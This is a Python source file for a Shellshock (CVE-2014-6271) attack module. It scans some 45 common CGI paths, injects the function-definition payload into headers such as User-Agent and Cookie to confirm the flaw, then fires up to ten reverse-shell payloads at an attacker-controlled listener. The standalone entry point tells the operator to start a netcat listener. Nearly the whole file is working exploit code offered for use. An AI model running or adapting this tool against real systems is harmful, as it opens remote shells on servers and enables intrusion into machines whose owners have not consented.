"""
Shellshock Attack Module (CVE-2014-6271)
Self-contained scanner and exploiter for Shellshock vulnerability
Author: Wiz-Works
Date: 2025-01-20
"""

import requests
import time
from urllib.parse import urljoin
from typing import List, Dict, Tuple, Optional
import sys
import os

# Import payload generator
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from generators.shellshock import ShellshockGenerator


class ShellshockModule:
    """
    Complete self-contained Shellshock attack module.
    Handles scanning, testing, and exploitation.
    """
    
    def __init__(self, base_url: str, lhost: str, lport: int, 
                 session: Optional[requests.Session] = None,
                 logger=None):
        """
        Initialize Shellshock module.
        
        Args:
            base_url: Target base URL
            lhost: Attacker listening IP
            lport: Attacker listening port
            session: Optional authenticated requests.Session
            logger: Optional logger object (uses print if None)
        """
        self.base_url = base_url
        self.lhost = lhost
        self.lport = lport
        self.session = session or requests.Session()
        self.logger = logger
        
        # Results storage
        self.vulnerable_endpoints = []
        self.shellshock_url = None
        self.shellshock_header = None
    
    def _log(self, level: str, message: str):
        """Internal logging helper."""
        if self.logger:
            if level == 'info':
                self.logger.info(message)
            elif level == 'success':
                self.logger.success(message)
            elif level == 'error':
                self.logger.error(message)
            elif level == 'warning':
                self.logger.warning(message)
        else:
            print(f"[{level.upper()}] {message}")
    
    def scan(self) -> List[Dict]:
        """
        Scan for Shellshock vulnerabilities.
        
        Returns:
            List of vulnerable endpoint dictionaries
        """
        self._log('info', "Scanning for Shellshock vulnerabilities...")
        
        # Common CGI paths
        cgi_paths = [
            '/cgi-bin/status',
            '/cgi-bin/test.cgi',
            '/cgi-bin/test',
            '/cgi-bin/user.sh',
            '/cgi-bin/admin.cgi',
            '/cgi-bin/printenv',
            '/cgi-bin/test.sh',
            '/cgi-bin/env.cgi',
            '/cgi-bin/hello.cgi',
            '/cgi-bin/date.cgi',
            '/cgi-bin/upload.cgi',
            '/cgi-bin/stats.cgi',
            '/cgi-bin/ping.cgi',
            '/cgi-bin/admin.sh',
            '/cgi-bin/info.sh',
            '/cgi-bin/system.sh',
            '/cgi-bin/config.sh',
            '/cgi-sys/test',
            '/cgi-sys/defaultwebpage.cgi',
            '/cgi-sys/entropysearch.cgi',
            '/cgi-local/test',
            '/cgi-local/admin.cgi',
            '/cgi-mod/index.cgi',
            '/cgi/test.cgi',
            '/cgi/admin.cgi',
            '/scripts/test.cgi',
            '/scripts/admin.cgi',
            '/cgi-script/test',
            '/htbin/test.cgi',
            '/cgis/test',
            '/admin/cgi-bin/test',
            '/admin/cgi-bin/status',
            '/administrator/cgi-bin/test',
            '/bin/test.cgi',
            '/cgibin/test',
            '/cgi_bin/test',
            '/test.cgi',
            '/status.cgi',
            '/printenv.cgi',
            '/env.cgi',
            '/admin.cgi',
            '/user.sh',
            '/info.cgi',
            '/cgi-bin/printenv.pl',
            '/cgi-bin/test-cgi'
        ]
        
        self._log('info', f"→ Checking {len(cgi_paths)} common CGI paths...")
        
        for path in cgi_paths:
            try:
                url = urljoin(self.base_url, path)
                
                # Check if endpoint exists
                response = self.session.get(url, timeout=5, allow_redirects=False)
                
                if response.status_code in [200, 500]:
                    self._log('info', f"  → Found CGI: {path}")
                    
                    # Test for vulnerability
                    is_vuln, header = self._test_vulnerability(url)
                    
                    if is_vuln:
                        endpoint = {
                            'url': url,
                            'path': path,
                            'header': header
                        }
                        self.vulnerable_endpoints.append(endpoint)
                        
                        self._log('success', f"  ✓ VULNERABLE: {path} (via {header})")
                        
                        # Store first vulnerable endpoint
                        if not self.shellshock_url:
                            self.shellshock_url = url
                            self.shellshock_header = header
                    
                    time.sleep(0.1)
                    
            except Exception:
                continue
        
        if self.vulnerable_endpoints:
            self._log('success', f"✓ Found {len(self.vulnerable_endpoints)} vulnerable endpoint(s)")
        else:
            self._log('warning', "✗ No Shellshock vulnerabilities found")
            self._log('info', "💡 Manual testing suggestions:")
            self._log('info', "   • Check for custom CGI paths")
            self._log('info', "   • Test authenticated CGI endpoints")
            self._log('info', "   • Try User-Agent injection manually")
        
        return self.vulnerable_endpoints
    
    def _test_vulnerability(self, cgi_url: str) -> Tuple[bool, Optional[str]]:
        """
        Test if CGI endpoint is vulnerable to Shellshock.
        
        Args:
            cgi_url: Full URL to CGI script
        
        Returns:
            (is_vulnerable, vulnerable_header_name)
        """
        # Test payload that outputs a marker
        test_payload = "() { :; }; echo 'Content-Type: text/plain'; echo; echo 'SHELLSHOCK_VULNERABLE'"
        
        # Headers to test
        headers_to_test = [
            'User-Agent',
            'Referer',
            'Cookie',
            'Accept',
            'Accept-Language',
            'X-Forwarded-For'
        ]
        
        for header_name in headers_to_test:
            try:
                headers = {header_name: test_payload}
                response = self.session.get(
                    cgi_url,
                    headers=headers,
                    timeout=5,
                    allow_redirects=False
                )
                
                if 'SHELLSHOCK_VULNERABLE' in response.text:
                    return (True, header_name)
                    
            except Exception:
                continue
        
        return (False, None)
    
    def exploit(self, start_listener_callback=None) -> bool:
        """
        Exploit Shellshock vulnerability.
        
        Args:
            start_listener_callback: Optional callback to start reverse shell listener
        
        Returns:
            True if exploitation attempted, False if no vulnerable endpoints
        """
        if not self.shellshock_url:
            self._log('error', "✗ No vulnerable endpoints to exploit")
            return False
        
        self._log('info', f"⚡ Targeting: {self.shellshock_url}")
        self._log('info', f"⚡ Vulnerable header: {self.shellshock_header}")
        
        # Generate payloads
        generator = ShellshockGenerator(self.lhost, self.lport)
        payloads = generator.generate_payloads()
        
        self._log('info', f"📦 Generated {len(payloads)} payloads")
        
        # Start listener if callback provided
        if start_listener_callback:
            self._log('info', f"🎧 Starting listener on {self.lhost}:{self.lport}")
            start_listener_callback()
            time.sleep(2)
        
        # Try each payload
        for i, payload in enumerate(payloads[:10], 1):
            self._log('info', f"⚡ Trying payload {i}/10...")
            
            try:
                headers = {self.shellshock_header: payload}
                self.session.get(
                    self.shellshock_url,
                    headers=headers,
                    timeout=10
                )
                
                time.sleep(2)
                
            except Exception:
                continue
        
        self._log('info', "✓ All payloads sent - check listener for shell")
        return True
    
    def run(self, start_listener_callback=None) -> bool:
        """
        Run complete Shellshock attack (scan + exploit).
        
        Args:
            start_listener_callback: Optional callback to start listener
        
        Returns:
            True if vulnerable and exploited, False otherwise
        """
        # Scan for vulnerabilities
        vulnerabilities = self.scan()
        
        if not vulnerabilities:
            return False
        
        # Exploit
        return self.exploit(start_listener_callback)


# Standalone usage example
if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="Shellshock Scanner and Exploiter")
    parser.add_argument("url", help="Target URL")
    parser.add_argument("lhost", help="Listener IP")
    parser.add_argument("lport", type=int, help="Listener port")
    parser.add_argument("--scan-only", action="store_true", help="Only scan, don't exploit")
    
    args = parser.parse_args()
    
    # Create module
    module = ShellshockModule(args.url, args.lhost, args.lport)
    
    if args.scan_only:
        # Just scan
        vulnerabilities = module.scan()
        if vulnerabilities:
            print("\n✓ Vulnerable endpoints:")
            for vuln in vulnerabilities:
                print(f"  - {vuln['url']} (via {vuln['header']})")
    else:
        # Scan and exploit
        print(f"\n⚠ Make sure listener is running: nc -lvnp {args.lport}")
        input("Press Enter when ready...")
        module.run()
